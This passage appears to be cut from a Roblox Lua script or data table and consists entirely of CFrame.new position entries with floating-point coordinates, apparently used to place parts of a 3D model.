CFrame.new(2.3000001907348633, -3.0999996662139893, -5),
CFrame.new(1.7999999523162842, -0.599999725818634, -4.5),
CFrame.new(3.799999952316284, 2.6000006198883057, -4.899999618530273),
CFrame.new(0.7499998211860657, -0.7000001072883606, 1.0500001907348633),
CFrame.new(2.299999713897705, 0.900000274181366, -0.5),
CFrame.new(2.299999952316284, -0.599999725818634, -6.5),
CFrame.new(3.299999713897705, 2.400000810623169, 0.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -5.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -3),
CFrame.new(-0.699999988079071, 2.3999998569488525, -2.700000286102295),
CFrame.new(3.299999952316284, -0.09999972581863403, -7),
CFrame.new(0.800000011920929, -0.599999725818634, -3),
CFrame.new(2.299999713897705, 1.9000003337860107, -3),
CFrame.new(0.30000001192092896, -2.0999996662139893, -4),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -7),
CFrame.new(1.7999999523162842, -0.09999972581863403, -5),
CFrame.new(2.799999713897705, 1.9000003337860107, 0.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -1.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -6.5),
CFrame.new(0.800000011920929, -3.0999996662139893, -5),
CFrame.new(3.799999952316284, 2.8000004291534424, -6.600000381469727),
CFrame.new(1.3000001907348633, -3.0999996662139893, -7),
CFrame.new(0.30000001192092896, -1.5999996662139893, -7),
CFrame.new(2.799999952316284, 0.900000274181366, -4),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -6.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -1.5),
CFrame.new(1.3000001907348633, -2.5999996662139893, -5),
CFrame.new(-0.699999988079071, 2.000000238418579, 0.19999980926513672),
CFrame.new(3.299999952316284, -0.09999972581863403, -6),
CFrame.new(-0.699999988079071, 2.3999998569488525, -5.200000762939453),
CFrame.new(0.30000001192092896, 0.900000274181366, -6),
CFrame.new(3.299999952316284, -0.599999725818634, -5.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -6.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -6),
CFrame.new(1.2999999523162842, 0.900000274181366, -1.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -2),
CFrame.new(1.799999713897705, 2.4000003337860107, -4.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, 0.5),
CFrame.new(2.799999952316284, 0.900000274181366, -1),
CFrame.new(1.2999999523162842, -0.09999972581863403, -3),
CFrame.new(3.299999713897705, 2.400000810623169, -4.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -4),
CFrame.new(-0.699999988079071, 2.200000047683716, 0.09999942779541016),
CFrame.new(-0.20000000298023224, -0.599999725818634, -3.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -7),
CFrame.new(0.30000001192092896, 1.9000003337860107, -3),
CFrame.new(1.799999713897705, 0.900000274181366, -0.5),
CFrame.new(2.799999713897705, 2.4000003337860107, -7),
CFrame.new(-0.699999988079071, 2.799999952316284, -6.600000381469727),
CFrame.new(2.799999952316284, 0.900000274181366, -1.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -6.5),
CFrame.new(3.799999952316284, 2.000000238418579, -2.3000001907348633),
CFrame.new(3.799999952316284, 2.8000004291534424, -4.100000381469727),
CFrame.new(1.3000001907348633, -3.0999996662139893, -6.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -5.5),
CFrame.new(3.799999952316284, 1.900000810623169, -7),
CFrame.new(2.299999713897705, 1.9000003337860107, -6),
CFrame.new(-0.699999988079071, 2.5999996662139893, -4.899999618530273),
CFrame.new(1.799999713897705, 0.900000274181366, -6.5),
CFrame.new(3.299999952316284, 0.900000274181366, -1),
CFrame.new(3.299999713897705, 1.900000810623169, -5),
CFrame.new(0.30000001192092896, 0.900000274181366, -0.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -1),
CFrame.new(2.299999713897705, 1.9000003337860107, -5.5),
CFrame.new(0.800000011920929, 0.900000274181366, 0),
CFrame.new(2.799999713897705, 1.9000003337860107, -1.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -1),
CFrame.new(1.2999999523162842, 1.9000003337860107, -5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -4.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -2),
CFrame.new(1.3000001907348633, -3.0999996662139893, -3.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -2),
CFrame.new(2.299999713897705, 1.9000003337860107, -3.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -3),
CFrame.new(0.800000011920929, -0.09999972581863403, -0.5),
CFrame.new(2.299999713897705, 0.900000274181366, 0),
CFrame.new(3.799999952316284, 2.4000003337860107, -7.700000762939453),
CFrame.new(2.299999952316284, -0.599999725818634, -3),
CFrame.new(0.30000001192092896, -2.0999996662139893, -2.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -6),
CFrame.new(0.30000001192092896, 0.900000274181366, -2),
CFrame.new(2.299999713897705, 0.900000274181366, -2.5),
CFrame.new(3.799999952316284, 2.4000003337860107, 1.3000001907348633),
CFrame.new(2.799999952316284, -0.599999725818634, -5.5),
CFrame.new(2.299999713897705, 0.900000274181366, -4),
CFrame.new(0.800000011920929, -0.599999725818634, -3.5),
CFrame.new(3.299999713897705, 2.400000810623169, -7),
CFrame.new(0.30000001192092896, -0.09999972581863403, -1.5),
CFrame.new(-0.699999988079071, 2.000000238418579, -2.3000001907348633),
CFrame.new(3.299999952316284, -0.09999972581863403, -5),
CFrame.new(-0.699999988079071, 2.8999998569488525, -6.899999618530273),
CFrame.new(0.30000001192092896, 1.9000003337860107, -1),
CFrame.new(3.799999952316284, 2.4000003337860107, -5.200000762939453),
CFrame.new(0.800000011920929, -3.0999996662139893, -5.5),
CFrame.new(3.799999952316284, 2.200000524520874, -6.5),
CFrame.new(-0.699999988079071, 1.8999998569488525, -2),
CFrame.new(3.299999713897705, 1.900000810623169, -6.5),
CFrame.new(3.799999952316284, 2.4000003337860107, -3.6999998092651367),
CFrame.new(3.799999952316284, 2.200000524520874, -4.90000057220459),
CFrame.new(1.2999999523162842, -0.599999725818634, -6.5),
CFrame.new(2.249999761581421, -0.7000001072883606, 1.0500001907348633),
CFrame.new(-0.699999988079071, 1.8999998569488525, 0.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -5.5),
CFrame.new(0.800000011920929, 0.900000274181366, -5),
CFrame.new(2.799999952316284, 0.900000274181366, -2.5),
CFrame.new(2.299999952316284, -2.0999996662139893, -1),
CFrame.new(1.0000003576278687, -4.599999904632568, 0.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -5),
CFrame.new(1.2999999523162842, -1.5999996662139893, -7),
CFrame.new(0.800000011920929, -0.09999972581863403, -3),
CFrame.new(0.800000011920929, -0.599999725818634, -5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -3.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, 0.5),
CFrame.new(2.799999952316284, -0.599999725818634, -1),
CFrame.new(-0.699999988079071, 2.200000047683716, -6.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -6),
CFrame.new(3.799999952316284, 2.4000003337860107, -7.700000762939453),
CFrame.new(2.799999713897705, 1.9000003337860107, -3.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, -6),
CFrame.new(1.799999713897705, 0.900000274181366, -1),
CFrame.new(1.2999999523162842, -0.09999972581863403, -3.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -3.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -0.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -6),
CFrame.new(1.2999999523162842, -0.09999972581863403, -6),
CFrame.new(2.799999952316284, -0.09999972581863403, 0.5),
CFrame.new(2.799999952316284, -0.599999725818634, -2.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -3),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -4.5),
CFrame.new(3.299999952316284, 0.900000274181366, 0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -4),
CFrame.new(0.800000011920929, 0.900000274181366, -2),
CFrame.new(3.799999952316284, 2.4000003337860107, -6.199999809265137),
CFrame.new(3.299999713897705, 1.900000810623169, -7),
CFrame.new(0.30000001192092896, -2.0999996662139893, -1),
CFrame.new(2.799999952316284, -2.5999996662139893, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, -1),
CFrame.new(3.299999952316284, 0.900000274181366, -4.5),
CFrame.new(2.799999952316284, -0.599999725818634, -6.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -4.5),
CFrame.new(3.299999952316284, -1.0999994277954102, 0.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -5.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -0.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, 0.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -5),
CFrame.new(2.249999761581421, -0.7000001072883606, 1.0500001907348633),
CFrame.new(-0.20000000298023224, -0.599999725818634, -6),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -4.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -7),
CFrame.new(0.30000001192092896, -2.0999996662139893, -4.5),
CFrame.new(2.799999952316284, 0.900000274181366, -4.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -2.4000000953674316),
CFrame.new(3.799999952316284, 2.6000006198883057, -2.4000000953674316),
CFrame.new(1.2999999523162842, 0.900000274181366, -1),
CFrame.new(0.800000011920929, -0.599999725818634, 0),
CFrame.new(1.799999713897705, 1.9000003337860107, -3.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -4.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -2.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, 0),
CFrame.new(-0.20000000298023224, 0.900000274181366, -0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -3.5),
CFrame.new(1.2999999523162842, -0.599999725818634, 0),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -3),
CFrame.new(-0.20000000298023224, -2.5999996662139893, -7),
CFrame.new(3.299999713897705, 1.900000810623169, -5.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -6.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -3.5),
CFrame.new(3.299999952316284, -3.099999189376831, -5.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -6.5),
CFrame.new(-0.699999988079071, 2.8999998569488525, 0.5999999046325684),
CFrame.new(1.7999999523162842, -2.5999996662139893, -4.5),
CFrame.new(2.799999952316284, 0.900000274181366, -5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -0.5),
CFrame.new(3.299999952316284, 0.900000274181366, -3),
CFrame.new(2.8000001907348633, -3.0999996662139893, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -1.1999998092651367),
CFrame.new(1.8000001907348633, -3.0999996662139893, -7),
CFrame.new(2.799999952316284, -1.5999996662139893, -0.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -4.5),
CFrame.new(0.30000001192092896, -3.0999996662139893, -7),
CFrame.new(2.299999952316284, -0.09999972581863403, -2),
CFrame.new(-0.699999988079071, 2.200000047683716, -7.40000057220459),
CFrame.new(0.30000001192092896, 0.900000274181366, -1),
CFrame.new(0.800000011920929, 0.900000274181366, -1.5),
CFrame.new(0.800000011920929, -2.5999996662139893, 0.5),
CFrame.new(2.299999713897705, 1.9000003337860107, -2),
CFrame.new(3.299999952316284, -0.09999972581863403, 0),
CFrame.new(3.299999713897705, 1.900000810623169, -1),
CFrame.new(1.799999713897705, 1.9000003337860107, -1.5),
CFrame.new(-0.20000000298023224, -1.0999999046325684, -6),
CFrame.new(3.299999952316284, -3.099999189376831, -6.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -7),
CFrame.new(1.2999999523162842, -0.599999725818634, -1),
CFrame.new(0.800000011920929, 0.900000274181366, -7),
CFrame.new(2.8000001907348633, -3.0999996662139893, -6),
CFrame.new(2.299999713897705, 2.4000003337860107, -7),
CFrame.new(-0.699999988079071, 1.8999998569488525, -7),
CFrame.new(1.7999999523162842, -2.5999996662139893, -3),
CFrame.new(3.799999952316284, 1.900000810623169, -4.5),
CFrame.new(3.799999952316284, 2.200000524520874, -2.40000057220459),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -6),
CFrame.new(0.30000001192092896, 0.900000274181366, -1.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -4.5),
CFrame.new(1.5499999523162842, -1.1999995708465576, 1.0500001907348633),
CFrame.new(1.799999713897705, 1.9000003337860107, -4.5),
CFrame.new(1.8000001907348633, -3.0999996662139893, -6),
CFrame.new(2.799999952316284, 0.900000274181366, -2),
CFrame.new(3.299999952316284, 0.900000274181366, -7),
CFrame.new(-0.699999988079071, 2.3999998569488525, -1.1999998092651367),
CFrame.new(3.799999952316284, 2.6000006198883057, -7.399999618530273),
CFrame.new(2.299999952316284, -0.09999972581863403, -1),
CFrame.new(2.799999952316284, -0.599999725818634, -3),
CFrame.new(1.2999999523162842, 0.900000274181366, -2),
CFrame.new(3.799999952316284, 2.9000003337860107, -1.9000000953674316),
CFrame.new(0.800000011920929, 0.900000274181366, -4.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -7),
CFrame.new(1.3000001907348633, -3.0999996662139893, -2),
CFrame.new(2.799999952316284, -1.5999996662139893, -3.5),
CFrame.new(3.799999952316284, 2.9000003337860107, -4.399999618530273),
CFrame.new(3.299999952316284, 0.900000274181366, -0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -4.5),
CFrame.new(-0.699999988079071, 2.000000238418579, -4.100000381469727),
CFrame.new(2.799999952316284, -0.599999725818634, -2),
CFrame.new(0.30000001192092896, -1.5999996662139893, -7),
CFrame.new(1.2999999523162842, -1.5999996662139893, -5),
CFrame.new(0.30000001192092896, -2.0999996662139893, -0.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, 0),
CFrame.new(3.799999952316284, 2.9000003337860107, -6.899999618530273),
CFrame.new(1.4499995708465576, -0.2000001072883606, 1.0500001907348633),
CFrame.new(0.800000011920929, -0.599999725818634, -4),
CFrame.new(-0.20000000298023224, 2.3999998569488525, -4.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -4.5),
CFrame.new(2.299999713897705, 0.900000274181366, -2),
CFrame.new(1.2999999523162842, 1.9000003337860107, -3),
CFrame.new(2.799999713897705, 2.4000003337860107, -2),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -2),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -3),
CFrame.new(0.800000011920929, 2.4000003337860107, -7),
CFrame.new(1.799999713897705, 0.900000274181366, -2.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -4),
CFrame.new(0.800000011920929, -1.5999996662139893, 0.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -5.5),
CFrame.new(-0.699999988079071, 2.000000238418579, -7.300000190734863),
CFrame.new(2.799999952316284, -1.5999996662139893, -6.5),
CFrame.new(2.299999713897705, 0.900000274181366, -3.5),
CFrame.new(1.2999999523162842, -1.5999996662139893, -6.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -6.5),
CFrame.new(2.799999952316284, -1.5999996662139893, 0),
CFrame.new(2.799999952316284, -0.599999725818634, 0),
CFrame.new(0.800000011920929, -2.5999996662139893, -7),
CFrame.new(2.799999952316284, -0.09999972581863403, -2),
CFrame.new(2.799999952316284, -1.5999996662139893, -7),
CFrame.new(0.30000001192092896, -0.599999725818634, -5.5),
CFrame.new(2.299999952316284, -2.0999996662139893, 0),
CFrame.new(2.799999952316284, 0.900000274181366, -6.5),
CFrame.new(0.800000011920929, 2.4000003337860107, 0.5),
CFrame.new(1.7999999523162842, -0.599999725818634, 0.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -5.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -5.5),
CFrame.new(2.799999952316284, 0.900000274181366, 0),
CFrame.new(3.799999952316284, 2.8000004291534424, 0.19999980926513672),
CFrame.new(-0.20000000298023224, -0.599999725818634, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -5.5),
CFrame.new(0.30000001192092896, 2.4000003337860107, 0.5),
CFrame.new(1.0499999523162842, -0.8999999165534973, 1.0500001907348633),
CFrame.new(1.799999713897705, 1.9000003337860107, 0.5),
CFrame.new(0.3999994397163391, 1.9000003337860107, 0.7999997138977051),
CFrame.new(0.30000001192092896, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, 0.900000274181366, -5),
CFrame.new(-0.20000000298023224, -1.0999999046325684, -6),
CFrame.new(-0.699999988079071, 2.3999998569488525, -6.199999809265137),
CFrame.new(0.30000001192092896, -0.09999972581863403, -2.5),
CFrame.new(2.799999952316284, -1.5999996662139893, 0.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -4.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -1.5),
CFrame.new(3.299999952316284, 0.900000274181366, 0),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -7),
CFrame.new(0.800000011920929, -0.09999972581863403, 0),
CFrame.new(0.800000011920929, 1.9000003337860107, 0.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -3),
CFrame.new(1.2999999523162842, 0.900000274181366, -7),
CFrame.new(2.799999713897705, 2.4000003337860107, 0.5),
CFrame.new(1.600000262260437, -4.599999904632568, 0.5),
CFrame.new(0.800000011920929, 0.900000274181366, -6.5),
CFrame.new(1.2999999523162842, -1.5999996662139893, -6),
CFrame.new(1.799999713897705, 0.900000274181366, -4.5),
CFrame.new(0.800000011920929, -1.5999996662139893, -5),
CFrame.new(0.800000011920929, 0.900000274181366, -6),
CFrame.new(2.799999952316284, -1.5999996662139893, -1),
CFrame.new(3.299999713897705, 1.900000810623169, -4.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -1.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -3.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -7),
CFrame.new(1.799999713897705, 1.9000003337860107, -1),
CFrame.new(-0.20000000298023224, 0.900000274181366, -4),
CFrame.new(1.7999999523162842, -0.09999972581863403, -1.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -5.5),
CFrame.new(3.799999952316284, 2.4000003337860107, 1.3000001907348633),
CFrame.new(0.30000001192092896, -0.599999725818634, -4.5),
CFrame.new(-0.699999988079071, 2.799999952316284, -7.300000190734863),
CFrame.new(3.299999952316284, -0.599999725818634, -5),
CFrame.new(0.800000011920929, -0.599999725818634, -7),
CFrame.new(1.3000001907348633, -3.0999996662139893, -2.5),
CFrame.new(0.30000001192092896, 2.4000003337860107, -7),
CFrame.new(3.299999952316284, 0.900000274181366, -2),
CFrame.new(0.800000011920929, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, -0.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -1.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, 0.5),
CFrame.new(2.799999952316284, 0.900000274181366, 0.5),
CFrame.new(3.299999952316284, 0.900000274181366, -1.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -4.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -7),
CFrame.new(3.299999952316284, 0.900000274181366, -6),
CFrame.new(0.800000011920929, -0.09999972581863403, -7),
CFrame.new(1.2999999523162842, -0.09999972581863403, -4.5),
CFrame.new(3.799999952316284, 2.200000524520874, 0.09999942779541016),
CFrame.new(1.799999713897705, 2.4000003337860107, 0.5),
CFrame.new(0.800000011920929, -0.599999725818634, -1),
CFrame.new(1.2999999523162842, -0.599999725818634, -4),
CFrame.new(2.299999952316284, -1.5999996662139893, -7),
CFrame.new(0.30000001192092896, -0.09999972581863403, -1),
CFrame.new(1.799999713897705, 2.4000003337860107, -2),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -4),
CFrame.new(-0.699999988079071, 2.000000238418579, 0.8999996185302734),
CFrame.new(3.299999952316284, -0.599999725818634, -6.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, 0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -6.199999809265137),
CFrame.new(0.30000001192092896, 1.9000003337860107, -4),
CFrame.new(1.799999713897705, 1.9000003337860107, -0.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, -5.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -0.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -1.5),
CFrame.new(2.299999713897705, 1.9000003337860107, 0),
CFrame.new(0.800000011920929, -2.5999996662139893, -4.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -6.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -5.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -2),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -6.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -7),
CFrame.new(0.30000001192092896, -0.09999972581863403, 0),
CFrame.new(0.800000011920929, 0.900000274181366, 0.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -6.5),
CFrame.new(1.799999713897705, 0.900000274181366, -5),
CFrame.new(1.2999999523162842, 0.900000274181366, 0),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -5.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -6),
CFrame.new(0.30000001192092896, -1.5999996662139893, -6.5),
CFrame.new(2.799999952316284, -0.599999725818634, -4.5),
CFrame.new(2.299999952316284, -1.5999996662139893, -6),
CFrame.new(1.2999999523162842, 0.900000274181366, -0.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -4.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -4),
CFrame.new(2.299999713897705, 1.9000003337860107, -7),
CFrame.new(-0.699999988079071, 2.000000238418579, -1.6000003814697266),
CFrame.new(0.30000001192092896, -2.0999996662139893, -3.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -2),
CFrame.new(3.299999952316284, -0.599999725818634, -3.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -7),
CFrame.new(0.800000011920929, 0.900000274181366, -0.5),
CFrame.new(-0.699999988079071, 2.200000047683716, -1.5),
CFrame.new(3.299999952316284, -3.099999189376831, -5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -0.20000028610229492),
CFrame.new(2.299999713897705, 1.9000003337860107, -4.5),
CFrame.new(2.299999952316284, -0.599999725818634, -4.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -1.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -5),
CFrame.new(2.799999952316284, -0.09999972581863403, -4.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -3),
CFrame.new(1.799999713897705, 1.9000003337860107, -5),
CFrame.new(2.299999952316284, -0.09999972581863403, -1.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, 0),
CFrame.new(0.800000011920929, -0.599999725818634, -2),
CFrame.new(0.30000001192092896, 1.9000003337860107, -7),
CFrame.new(1.2999999523162842, -0.599999725818634, -2),
CFrame.new(-0.699999988079071, 2.3999998569488525, -3.6999998092651367),
CFrame.new(3.299999952316284, -1.0999994277954102, -1),
CFrame.new(1.799999713897705, 0.900000274181366, -3.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -2),
CFrame.new(0.30000001192092896, -2.0999996662139893, -3),
CFrame.new(2.299999952316284, -0.09999972581863403, -6),
CFrame.new(3.299999952316284, -3.099999189376831, -6),
CFrame.new(1.7999999523162842, -0.599999725818634, -6),
CFrame.new(-0.20000000298023224, -0.09999972581863403, 0),
CFrame.new(-0.20000000298023224, -2.5999996662139893, -5),
CFrame.new(2.799999952316284, 0.900000274181366, -3.5),
CFrame.new(3.299999713897705, 1.900000810623169, -4),
CFrame.new(3.299999952316284, -0.599999725818634, -1.5),
CFrame.new(0.30000001192092896, -3.0999996662139893, -5.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -4.5),
CFrame.new(3.299999713897705, 1.900000810623169, -1.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -2.700000286102295),
CFrame.new(0.30000001192092896, -3.0999996662139893, -6),
CFrame.new(2.799999952316284, -1.5999996662139893, -5),
CFrame.new(3.299999952316284, -1.5999994277954102, -6.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -1),
CFrame.new(0.30000001192092896, 0.900000274181366, -5.5),
CFrame.new(-0.699999988079071, 2.799999952316284, -4.100000381469727),
CFrame.new(2.299999713897705, 1.9000003337860107, -1.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, 0.09999990463256836),
CFrame.new(1.799999713897705, 1.9000003337860107, -3),
CFrame.new(-0.699999988079071, 2.3999998569488525, -1.1999998092651367),
CFrame.new(3.299999952316284, -0.599999725818634, -7),
CFrame.new(0.30000001192092896, 2.4000003337860107, -4.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -6.5),
CFrame.new(1.3000001907348633, -3.0999996662139893, 0.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -4),
CFrame.new(1.799999713897705, 0.900000274181366, -5.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -1),
CFrame.new(1.2999999523162842, 1.9000003337860107, -0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -2),
CFrame.new(0.30000001192092896, 0.900000274181366, 0),
CFrame.new(1.3000001907348633, -4.400000095367432, 0.5),
CFrame.new(0.800000011920929, -0.599999725818634, 0.5),
CFrame.new(3.299999713897705, 1.900000810623169, -6),
CFrame.new(3.299999952316284, 0.900000274181366, -4),
CFrame.new(0.30000001192092896, -0.09999972581863403, -3.5),
CFrame.new(2.299999952316284, -0.09999972581863403, 0),
CFrame.new(1.2999999523162842, 1.9000003337860107, -5.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -6),
CFrame.new(2.299999952316284, -0.09999972581863403, -2.5),
CFrame.new(1.2999999523162842, -0.599999725818634, 0.5),
CFrame.new(0.30000001192092896, -1.5999996662139893, -5),
CFrame.new(-0.699999988079071, 2.200000047683716, -4.90000057220459),
CFrame.new(-0.699999988079071, 2.799999952316284, -4.800000190734863),
CFrame.new(3.299999952316284, 0.900000274181366, -6.5),
CFrame.new(0.800000011920929, 2.4000003337860107, -2),
CFrame.new(3.299999952316284, -1.5999994277954102, -5),
CFrame.new(0.800000011920929, -0.599999725818634, -1.5),
CFrame.new(2.799999952316284, -0.599999725818634, 0.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -4),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -4),
CFrame.new(1.799999713897705, 0.900000274181366, 0),
CFrame.new(0.800000011920929, 0.900000274181366, -2.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, 0),
CFrame.new(0.30000001192092896, -3.0999996662139893, -5),
CFrame.new(0.30000001192092896, 0.900000274181366, 0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -4),
CFrame.new(2.299999713897705, 0.900000274181366, -4.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -7),
CFrame.new(2.799999952316284, -0.599999725818634, -6),
CFrame.new(1.2999999523162842, 0.900000274181366, -4.5),
CFrame.new(2.299999713897705, 1.9000003337860107, 0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -2.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, 0.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -6.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -6),
CFrame.new(0.30000001192092896, -0.09999972581863403, 0.5),
CFrame.new(1.2999999523162842, 0.900000274181366, 0.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -0.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -0.5),
CFrame.new(3.799999952316284, 2.4000003337860107, -0.20000028610229492),
CFrame.new(2.299999952316284, -0.599999725818634, -6),
CFrame.new(1.7999999523162842, -0.599999725818634, -2.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -6),
CFrame.new(2.299999713897705, 1.9000003337860107, -0.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, 1),
CFrame.new(1.7999999523162842, -0.599999725818634, -6.5),
CFrame.new(1.2999999523162842, -2.0999996662139893, 0.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -2.5),
CFrame.new(-0.699999988079071, 2.200000047683716, -4),
CFrame.new(0.800000011920929, 0.900000274181366, -3),
CFrame.new(0.30000001192092896, 0.900000274181366, -5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -5),
CFrame.new(-0.699999988079071, 2.799999952316284, -1.6000003814697266),
CFrame.new(2.3000001907348633, -3.0999996662139893, -6.5),
CFrame.new(1.300000548362732, -4.599999904632568, 0.3000001907348633),
CFrame.new(3.799999952316284, 2.6000006198883057, 0.09999990463256836),
CFrame.new(2.799999952316284, -0.599999725818634, -1.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -2.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, 0.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, 1.3000001907348633),
CFrame.new(0.800000011920929, 1.9000003337860107, -0.5),
CFrame.new(2.299999713897705, 0.900000274181366, -6),
CFrame.new(2.799999952316284, -0.599999725818634, -5),
CFrame.new(0.30000001192092896, -0.599999725818634, -5),
CFrame.new(2.299999952316284, -0.09999972581863403, -5.5),
CFrame.new(2.8000001907348633, -3.0999996662139893, -5),
CFrame.new(3.299999952316284, -1.5999994277954102, -5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -1),
